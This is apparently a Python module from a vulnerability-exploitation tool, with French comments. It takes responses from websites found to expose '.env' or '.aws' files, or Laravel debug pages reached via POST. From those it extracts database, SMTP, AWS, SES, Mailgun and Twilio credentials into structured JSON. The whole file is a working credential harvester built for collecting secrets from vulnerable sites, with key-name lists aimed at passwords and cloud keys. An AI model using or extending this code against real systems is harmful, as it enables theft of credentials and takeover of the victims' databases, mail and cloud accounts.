# cython: language_level=3

# Code for .env disclosure , .aws disclosure

import json
import re
from src.utils.generics.generic import parse_content


class Extact_info_Common_1:
    def __init__(self):
        pass

    def run(self, response, urlvuln):
        if "(via POST)" in urlvuln:
            return json.loads(self.extract_env_from_post(response, urlvuln))
        else:
            return json.loads(self.extract_info_from_env_file(response))

    def extract_info_from_env_file(self, env_text):
        db_keys = {
            "WORDPRESS_DB_HOST": "db host",
            "WORDPRESS_DB_NAME": "db name",
            "WORDPRESS_DB_USER": "db username",
            "WORDPRESS_DB_PASSWORD": "db password",
            "_DB_HOST": "db host",
            "_DB_DATABASE": "db name",
            "_DB_USER": "db username",
            "_DB_PASSWORD": "db password",
            "DB_CONNECTION": "connection",
            "DB_HOST": "db host",
            "DB_PORT": "db port",
            "DB_DATABASE": "db name",
            "DB_USERNAME": "db username",
            "DB_PASSWORD": "db password",
            "DB_USER": "db username",
            "DB_PASS": "db password",
            "DB_PWD": "db password",
            "DB_DEVICE": "db name",
            "DB_LOGIN": "db username",
            "DB_NAME": "db name",
            "DB_CONNECTION_SECOND": "connection",
            "DB_PORT_SECOND": "db port",
            "DB_HOST_SECOND": "db host",
            "DB_DATABASE_SECOND": "db name",
            "DB_USERNAME_SECOND": "db username",
            "DB_PASSWORD_SECOND": "db password",
            "DB_CONNECTION_SECONDARY": "connection",
            "DB_HOST_SECONDARY": "db host",
            "DB_PORT_SECONDARY": "db port",
            "DB_DATABASE_SECONDARY": "db name",
            "DB_USERNAME_SECONDARY": "db username",
            "DB_PASSWORD_SECONDARY": "db password",
            "MYSQL_EXTERNAL_PORT": "db port",
            "MYSQL_USER": "db username",
            "MYSQL_PASSWORD": "db password",
            "MYSQL_DATABASE": "db name",
            "MYSQL_ROOT_PASSWORD": "db password",
        }

        smtp_keys = {
            "MAIL_MAILER": "smtp mailer",
            "MAIL_HOST": "smtp host",
            "MAIL_PORT": "smtp port",
            "MAIL_USERNAME": "smtp username",
            "MAIL_PASSWORD": "smtp password",
            "MAIL_ENCRYPTION": "smtp encryption",
            "MAIL_FROM_ADDRESS": "smtp from address",
            "MAIL_FROM_NAME": "smtp from name",
        }

        aws_keys = {
            "AWS_ACCESS_KEY_ID": "aws key id",
            "AWS_SECRET_ACCESS_KEY": "aws secret key",
            "AWS_DEFAULT_REGION": "aws region",
            "AWS_BUCKET": "aws bucket",
            "AWS_USE_PATH_STYLE_ENDPOINT": "aws endpoint",
            "aws_access_key_id": "aws key id",
            "aws_secret_access_key": "aws secret key",
        }

        mailgun_keys = {
            "MAILGUN_DOMAIN": "mailgun domain",
            "MAILGUN_SECRET": "mailgun secret",
            "MAILGUN_API_KEY": "mailgun secret",
            "MAILGUN_SMTP_LOGIN": "mailgun smtp username",
            "MAILGUN_DEFAULT_PASSWORD": "mailgun smtp password",
        }

        twilio_keys = {
            "TWILIO_SID": "twilio sid",
            "TWILIO_TOKEN": "twilio token",
        }

        # Split the text into lines and handle both commented and uncommented lines
        lines = re.split(r"\n+", env_text)
        uncommented_lines = [line for line in lines if not re.match(r"\s*#", line)]

        commented_lines = [
            re.sub(r"^\s*#", "", line) for line in lines if re.match(r"\s*#", line)
        ]

        def clean_value(value):
            if (
                value.startswith('"') and value.endswith('"') and value.count('"') == 2
            ) or (
                value.startswith("'") and value.endswith("'") and value.count("'") == 2
            ):
                return value.strip(
                    "\"'"
                )  # Supprime à la fois les guillemets simples et doubles
            return value

        def extract_info(lines, key_map):
            info_list = []
            current_info = {}
            for line in lines:
                if "=" in line:
                    parts = line.split("=")
                    key = parts[0].strip()
                    value = "=".join(parts[1:]).strip()
                    if key in key_map:
                        mapped_key = key_map[key]
                        if mapped_key in current_info:
                            # Si la clé est déjà présente, cela signifie un nouvel ensemble d'informations commence.
                            info_list.append(current_info)
                            current_info = {}
                        current_info[mapped_key] = clean_value(value)

            if current_info:
                # Ajouter le dernier ensemble d'informations s'il existe.
                info_list.append(current_info)
            return info_list

        result = {
            "database": extract_info(uncommented_lines, db_keys)
            + extract_info(commented_lines, db_keys),
            "smtp": extract_info(uncommented_lines, smtp_keys)
            + extract_info(commented_lines, smtp_keys),
            "aws": extract_info(uncommented_lines, aws_keys)
            + extract_info(commented_lines, aws_keys),
            "mailgun": extract_info(uncommented_lines, mailgun_keys)
            + extract_info(commented_lines, mailgun_keys),
            "twilio": extract_info(uncommented_lines, twilio_keys)
            + extract_info(commented_lines, twilio_keys),
        }

        return json.dumps(result, indent=4)

    def extract_env_from_post(self, html_data, urlvuln):
        # Utiliser BeautifulSoup pour parser le HTML
        # soup = BeautifulSoup(html_data, "html.parser")
        soup = parse_content(self, html_data, urlvuln)
        if soup is None:
            return json.dumps({}, indent=4)

        # Trouver toutes les lignes de tableau avec des données d'environnement
        env_vars = soup.find_all("tr")

        # Structures pour stocker les informations reformatées
        db_data = {}
        smtp_data = {}
        aws_data = {}

        # Expression régulière pour détecter les clés d'intérêt
        db_pattern = re.compile(r"^DB_")
        smtp_pattern = re.compile(r"^MAIL_")
        aws_pattern = re.compile(r"^AWS_")
        ses_pattern = re.compile(r"^SES_")

        # Mappings pour les nouvelles clés
        db_keys_map = {
            "DB_HOST": "db host",
            "DB_DATABASE": "db name",
            "DB_USERNAME": "db username",
            "DB_PASSWORD": "db password",
            "DB_PORT": "db port",
        }

        smtp_keys_map = {
            "MAIL_HOST": "smtp host",
            "MAIL_PORT": "smtp port",
            "MAIL_USERNAME": "smtp username",
            "MAIL_PASSWORD": "smtp password",
            "MAIL_ENCRYPTION": "smtp encryption",
        }

        aws_keys_map = {
            "AWS_ACCESS_KEY_ID": "aws_key_id",
            "AWS_SECRET_ACCESS_KEY": "aws_secret_key",
            "AWS_DEFAULT_REGION": "aws_region",
            "SES_KEY": "aws_key_id",
            "SES_SECRET": "aws_secret_key",
            "SES_REGION": "aws_region",
            # 'AWS_BUCKET': 'aws_bucket'  # Uncomment if you want to include the bucket
        }

        # Parcourir chaque ligne pour trouver les clés et valeurs correspondantes
        for var in env_vars:
            key_tag, value_tag = var.find_all("td")
            key = key_tag.get_text().strip()
            value = (
                value_tag.get_text().strip().strip('"')
            )  # Enlever les guillemets supplémentaires

            # Vérifier si la clé correspond aux motifs des groupes d'intérêt et les reformater
            if db_pattern.match(key) and key in db_keys_map:
                db_data[db_keys_map[key]] = value
            elif smtp_pattern.match(key) and key in smtp_keys_map:
                smtp_data[smtp_keys_map[key]] = value
            elif aws_pattern.match(key) and key in aws_keys_map:
                aws_data[aws_keys_map[key]] = value
            elif ses_pattern.match(key) and key in aws_keys_map:
                aws_data[aws_keys_map[key]] = value

        # Construire le nouveau dictionnaire de configuration
        new_config = {
            "database": [db_data] if db_data else [],
            "smtp": [smtp_data] if smtp_data else [],
            "aws": [aws_data] if aws_data else [],
        }

        # Convertir en JSON si nécessaire
        json_output = json.dumps(new_config, indent=4)
        return json_output
